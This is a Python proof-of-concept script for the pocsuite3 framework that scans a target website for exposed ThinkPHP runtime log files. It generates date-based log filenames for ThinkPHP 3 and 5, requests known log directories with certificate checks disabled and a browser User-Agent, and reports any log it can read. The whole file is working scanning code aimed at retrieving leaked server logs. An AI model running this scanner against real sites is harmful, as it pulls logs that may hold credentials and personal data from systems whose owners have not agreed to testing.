#!/usr/bin/env python 
# -*- coding: utf-8 -*-
# @Time    : 2022/2/26 12:46
# @Author  : Cl0udG0d
# @File    : thinkphp日志泄露.py
# @Github: https://github.com/Cl0udG0d
from pocsuite3.api import requests
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase, logger
import ssl
import datetime


ssl._create_default_https_context = ssl._create_unverified_context

class TestPOC(POCBase):
    vulLevel = 3
    vulID = ''
    version = '1.0'
    vulDate = ''
    references = ['']
    name = 'thinkphp日志泄露'
    appPowerLink = ''
    appName = 'thinkphp'
    appVersion = ''
    vulType = '敏感信息泄露'
    desc = '''
    '''
    samples = ['']

    def getTPLogFilename(self,version):
        now_year = datetime.datetime.now().year
        now_month = datetime.datetime.now().month
        now_day = datetime.datetime.now().day
        begin_date = datetime.date(now_year, now_month, 1)
        end_date = datetime.date(now_year, now_month, now_day)
        date_list = [begin_date + datetime.timedelta(days=i) for i in range((end_date - begin_date).days + 1)]
        filename_list = []
        for date in date_list:
            if version == 3:
                filename_list.append(
                    "{:0>2d}_{:0>2d}_{:0>2d}.log".format(int(str(date.year)[2:]), date.month, date.day))
            elif version == 5:
                filename_list.append("{}{:0>2d}/{:0>2d}.log".format(date.year, date.month, date.day))
        return filename_list



    def _verify(self):
        result = {}
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
        }
        log_path_list = {
            '3': ['/Runtime/Logs/', '/App/Runtime/Logs/', '/Application/Runtime/Logs/Admin/',
                '/Application/Runtime/Logs/Home/', '/Application/Runtime/Logs/'],
            '5': ['/runtime/log/'],
        }

        for temppath in log_path_list['3']:
            filename_list=self.getTPLogFilename(3)
            for filename in filename_list:
                logpath=temppath+filename
                vulurl = "{}{}".format(
                    self.url.rstrip('/'), logpath)
                logger.info("Scan {}".format(vulurl))
                try:
                    resp = requests.get(url=vulurl, headers=headers, timeout=3, verify=False)
                    if "INFO" in resp.text and resp.status_code==200:
                        result['VerifyInfo'] = {}
                        result['VerifyInfo']['url'] = vulurl
                        return self.parse_attack(result)
                except Exception as e:
                    logger.error("connect target '{} failed!'".format(vulurl))
                    pass



        for temppath in log_path_list['5']:
            filename_list=self.getTPLogFilename(5)
            for filename in filename_list:
                logpath=temppath+filename
                vulurl = "{}{}".format(
                    self.url.rstrip('/'), logpath)
                logger.info("Scan {}".format(vulurl))
                try:
                    resp = requests.get(url=vulurl, headers=headers, timeout=3, verify=False)
                    if "INFO" in resp.text and resp.status_code==200:
                        result['VerifyInfo'] = {}
                        result['VerifyInfo']['url'] = vulurl
                        return self.parse_attack(result)
                except Exception as e:
                    logger.error("connect target '{} failed!'".format(vulurl))
                    pass

        return self.parse_attack(result)



    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output

register_poc(TestPOC)

